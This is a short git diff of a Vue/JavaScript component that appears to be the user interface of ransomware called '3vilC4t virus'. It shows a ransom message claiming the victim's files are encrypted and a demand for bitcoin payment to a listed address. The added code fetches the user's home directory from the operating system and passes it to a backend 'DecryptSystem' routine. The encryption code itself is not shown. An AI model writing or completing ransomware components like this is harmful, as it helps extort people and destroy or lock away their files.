@@ -16,13 +16,24 @@ export default {
       message: "You have been infected by 3vilC4t virus. Your files have been encrypted. Do not attempt to decrypt it on your own. It will cause irreversible damage.\n",
       message2: "Pay the ransom to receive the decryption key. You only have 1 attempt.",
       address: "0.0048 BTC to mjD6LE6rK9cGSrWmuTK5haFULEUUyceakf ",
-      decKey: ""
+      decKey: "",
+      userprofile: getRootDir,
+      test: ""
     };
   },
   methods: {
     beginDecryption: function() {
       var self = this;
-      console.log("Decryption key is ", self.decKey)
+      // TODO: Add the second arg to DecryptSystem
+      window.backend.DecryptSystem(self.userprofile).then(result => {
+        self.test = result
+      })
+    },
+    getRootDir: function() {
+      var self = this;
+      window.backend.osEnvWrapper().then(result => {
+        self.userprofile = result
+      })
     }
   }
 };
